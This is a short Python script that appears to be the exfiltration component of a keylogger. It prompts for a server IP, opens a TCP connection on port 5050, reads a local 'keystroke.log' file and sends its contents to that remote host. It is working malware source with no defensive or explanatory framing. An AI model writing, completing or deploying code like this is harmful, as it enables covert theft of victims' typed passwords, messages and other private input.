import socket

HEADER = 3048
PORT = 5050
FORMAT = "utf-8"
# DISCONNECT_MESSAGE = "!TC!"

SERVER = input("[CONNECT] Enter IPv4 address of the server: ")
ADDR = (SERVER, PORT)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


def send():  # (msg)
    # message = msg.encode(FORMAT)
    # msg_length = len(message)
    # send_length = str(msg_length).encode(FORMAT)
    # send_length += b' ' * (HEADER - len(send_length))
    # client.send(send_length)
    # client.send(message)
    file = open('./log/keystroke.log', 'r')
    data = file.read()
    client.send(f"[INFO] [{SERVER}]: \n".encode(FORMAT))
    client.send(data.encode(FORMAT))


send()
